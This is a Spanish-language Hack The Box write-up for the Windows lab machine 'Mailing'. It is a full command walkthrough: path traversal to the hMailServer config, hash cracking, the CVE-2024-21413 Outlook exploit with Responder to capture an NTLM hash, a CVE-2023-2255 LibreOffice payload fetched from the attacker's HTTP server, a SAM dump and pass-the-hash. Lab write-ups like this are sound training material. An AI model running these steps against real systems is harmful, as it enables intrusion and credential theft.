---
title: Mailing
description: Mailing es una máquina Windows que ejecuta hMailServer y alberga un sitio web vulnerable a Path Traversal. Esta vulnerabilidad se puede explotar para acceder al archivo de configuración de hMailServer, revelando el hash de la contraseña del Administrador. Descifrar este hash proporciona la contraseña del Administrador para la cuenta de correo electrónico. Aprovechamos CVE-2024-21413 en la aplicación de correo de Windows en el host remoto para capturar el hash NTLM del usuario maya. Luego podemos descifrar este hash para obtener la contraseña y acceder como usuario maya a través de WinRM. Para la escalada de privilegios, explotamos CVE-2023-2255 en LibreOffice
date: 2024-06-27
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-mailing/mailing_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - windows
  - hack_the_box
  - fuzzing_web
  - lfi
  - path_traversal
  - rce
  - cve
  - smtp
  - http
  - winrm
  - tcp
  - information_gathering
  - web_analysis
  - cve_exploitation
  - privilege_escalation

---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/mailing:-$ ping -c 1 10.10.11.14 
PING 10.10.11.14 (10.10.11.14) 56(84) bytes of data.
64 bytes from 10.10.11.14: icmp_seq=1 ttl=127 time=317 ms

--- 10.10.11.14 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 317.055/317.055/317.055/0.000 ms
```
```terminal
/home/kali/Documents/htb/machines/mailing:-$ nmap -p- -sS --min-rate 5000 10.10.11.14 -vvv -n -Pn -oG map1
Host: 10.10.11.14 ()	Status: Up
Host: 10.10.11.14 ()	Ports: 25/open/tcp//smtp///, 80/open/tcp//http///, 110/open/tcp//pop3///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 143/open/tcp//imap///, 445/open/tcp//microsoft-ds///, 465/open/tcp//smtps///, 587/open/tcp//submission///, 993/open/tcp//imaps///, 5040/open/tcp/////, 5985/open/tcp//wsman///, 7680/open/tcp//pando-pub///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49669/open/tcp/////	
Ignored State: filtered (65516)
```
```terminal
/home/kali/Documents/htb/machines/mailing:-$ nmap -sCV -p25,80,110,135,139,143,445,465,587,993,5040,5985 -vvv -oN map2
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mailing
| http-methods: 
|_  Potentially risky methods: TRACE
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: IMAP4rev1 ACL NAMESPACE IMAP4 IDLE completed CAPABILITY OK RIGHTS=texkA0001 CHILDREN QUOTA SORT
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
587/tcp open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 ACL NAMESPACE IMAP4 IDLE completed CAPABILITY OK RIGHTS=texkA0001 CHILDREN QUOTA SORT
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```
```terminal
/home/kali/Documents/htb/machines/mailing:-$ crackmapexec smb 10.10.11.14
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
```
```terminal
/home/kali/Documents/htb/machines/mailing:-$ echo '10.10.11.14\tmailing.htb\tMAILING.mailing.htb' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/htb/machines/mailing:-$ whatweb mailing.htb
http://mailing.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.14], Microsoft-IIS[10.0], PHP[8.3.3,], Title[Mailing], X-Powered-By[PHP/8.3.3, ASP.NET]
```
```terminal
/home/kali/Documents/htb/machines/mailing:-$ dirsearch -u http://mailing.htb/ -x 403,404,400
[13:53:39] Starting: 
[14:00:50] 200 -  541B  - /assets/                                                                  
[14:00:50] 301 -  160B  - /assets  ->  http://mailing.htb/assets/
[14:03:30] 200 -   31B  - /download.php
```
---
## Web Analysis

![](/assets/img/htb-writeup-mailing/mailing1.png)

```terminal
/home/kali/Documents/htb/machines/mailing:-$ searchsploit hmailserver 
```

![](/assets/img/htb-writeup-mailing/mailing2.png)

Intercepto una peticion 'GET' por BurpSuite del directorio '/download' y descubro que es vulnerable a LFI.

![](/assets/img/htb-writeup-mailing/mailing3.png)

<https://www.hmailserver.com/documentation/v5.6/?page=reference_inifilesettings>

Revisando la documentacion de hmailserver encuentro que la contraseña de administrador esta guardada en el archivo 'C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI' y codificada en MD5.

![](/assets/img/htb-writeup-mailing/mailing4.png)

```terminal
/home/kali/Documents/htb/machines/mailing:-$ echo '841bb5acfa6779ae432fd7a4e6600ba7' > hash.txt

/home/kali/Documents/htb/machines/mailing:-$ hashcat --show hash.txt
0      | MD5       | Raw Hash

/home/kali/Documents/htb/machines/mailing:-$ hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
```
Me conecto por 'telnet' pero no encuentro nada relevante.

```terminal
/home/kali/Documents/htb/machines/mailing:-$ telnet 10.10.11.14 110
Trying 10.10.11.14...
Connected to 10.10.11.14.
Escape character is '^]'.
+OK POP3
USER administrator@mailing.htb
+OK Send your password
PASS homenetworkingadministrator
+OK Mailbox locked and ready
LIST
+OK 0 messages (0 octets)
```

## CVE Exploitation

Teniendo las credenciales del usario 'administrator' puedo aprovechar la vulnerabilidad CVE-2024-21413.

<https://nvd.nist.gov/vuln/detail/CVE-2024-21413>

```terminal
/home/kali/Documents/htb/machines/mailing:-$ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file
```
```terminal
/home/kali/Documents/htb/machines/mailing:-$ sudo responder -I tun0 -v
[+] Listening for events...
```
```terminal
/home/kali/Documents/htb/machines/mailing:-$ python CVE-2024-21413.py --server 10.10.11.14 --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.20/IPC$" --subject "XD"

✅ Email sent successfully.
```

* El Responder debe estar correctamente configurado.

En teoria con ejecutar el exploit una vez tendria que ser suficiente, pero la maquina no funciona muy bien.

```terminal
/home/kali/Documents/htb/machines/mailing:-$ ./script.sh
```
![](/assets/img/htb-writeup-mailing/mailing6.png)

```terminal
/home/kali/Documents/htb/machines/mailing:-$ echo 'maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F00430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000' > hash2.txt

/home/kali/Documents/htb/machines/mailing:-$ hashcat --show hash2.txt
5600 | NetNTLMv2 | Network Protocol

/home/kali/Documents/htb/machines/mailing:-$ hashcat -a 0 -m 5600 hash2.txt /usr/share/wordlists/rockyou.txt
m4y4ngs4ri
```
Con las credenciales del usuario 'maya', puedo conectarme por el puerto '5985' usando Evil-WinRM.

```terminal
/home/kali/Documents/htb/machines/mailing:-$ evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri

Evil-WinRM PS C:\Users\maya\Desktop> type user.txt
```

---
## Privilege Escalation & CVE Exploitation

Enumerando el sistema encuentro una version de LibreOffice que es vulnerable, CVE-2023-2255.

<https://nvd.nist.gov/vuln/detail/CVE-2023-2255>

```terminal
Evil-WinRM* PS C:\Program Files\libreoffice\readmes> type readme_en-US.txt
LibreOffice 7.4 ReadMe
```
```terminal
/home/kali/Documents/htb/machines/mailing:-$ git clone https://github.com/elweth-sec/CVE-2023-2255.git
```

El usuario 'maya' no forma parte del grupo 'administradores'.

![](/assets/img/htb-writeup-mailing/mailing6_5.png)

```terminal
/home/kali/Documents/htb/machines/mailing:-$ python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
File exploit.odt has been created!

/home/kali/Documents/htb/machines/mailing:-$ python3 -m http.server 8005
	Serving HTTP on 0.0.0.0 port 8005 (http://0.0.0.0:8005/) ...

Evil-WinRM* PS C:\Important Documents> curl -o exploit.odt 10.10.16.72:8005/exploit.odt
	...10.10.11.14 - - [27/Jun/2024 15:42:13] "GET /exploit.odt HTTP/1.1" 200 -
```

![](/assets/img/htb-writeup-mailing/mailing6_4.png)

Importo el exploit a la maquina victima y lo ejecuto.

```terminal
Evil-WinRM* PS C:\Important Documents> ./exploit.odt
```

Ahora el usuario 'maya' forma parte del grupo 'administradores'.

![](/assets/img/htb-writeup-mailing/mailing6_6.png)

Con Crackmapexec puedo leer el hash de autentificacion del usuario 'maya', de la base de datos SAM.

```terminal
/home/kali/Documents/htb/machines/mailing:-$ crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
```

![](/assets/img/htb-writeup-mailing/mailing6_7.png)

Por ultimo, utilizo Impacket-WMIexec con las credenciales del usuario 'localadmin'.

```terminal
/home/kali/Documents/htb/machines/mailing:-$ impacket-wmiexec localadmin@10.10.11.14 -hashes "9aa582783780d1546d62f2d102daefae"

C:\Users\localadmin\Desktop> type root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/600" target="_blank">***Litio7 has successfully solved Mailing from Hack The Box***</a>
{: .prompt-info style="text-align:center" }